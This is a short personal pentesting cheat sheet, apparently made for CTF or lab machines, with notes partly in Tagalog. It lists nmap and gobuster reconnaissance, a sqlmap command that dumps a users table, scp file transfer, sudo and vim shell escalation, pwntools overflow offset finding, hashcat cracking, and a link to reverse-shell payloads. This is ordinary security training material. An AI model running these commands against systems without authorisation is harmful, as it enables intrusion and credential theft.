

## Reconaissance

##### nmap scanning

```bash
nmap -open -p- -T4 <ip>
nmap -A -p<ports> -T4 <ip>
```

directory enumeration
gobuster dir -u <ip> -w <wordlist> -t <no. threads> -x <strings>
dirbuster

checking for sql injections
sqlmap -u http://10.10.60.252/administrator.php --forms --dump --dbms=mysql
--tables -T users --dump

=====================================================================
FOOTHOLD
=====================================================================

connecting ssh
ssh user@<ip> -p <port> 

putting files in the target system
scp {path to linenum} {user}@{host}:{path}. Example: scp /opt/LinEnum.sh pingu@10.10.10.10:/tmp

=====================================================================
PRIVELEGE ESCALATION
=====================================================================

sudo-able commands
sudo -l

running bash in vim
:shell 

=====================================================================
MISC
=====================================================================

use gdb in checking binary files
pwn commandd to check excessive input
r < <(cyclic 50)
pwn command to check how many excessive input is actually needed to overwrite certain address
cyclic -l 0x6161616c
find the address of a program (shell)
disassemble shell

in cracking hashes
hashcat -m <hash algo mode> <hash file path> <wordlist path>
https://hashcat.net/wiki/doku.php?id=example_hashes

=====================================================================
REMINDERS
=====================================================================

Proper documentation of Reconaissence

If nakakita ng login, check for sql injections (sqlmap)

If nakafoothold, check sudoable commands, then think of pano makakuha ng root reverse shell
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet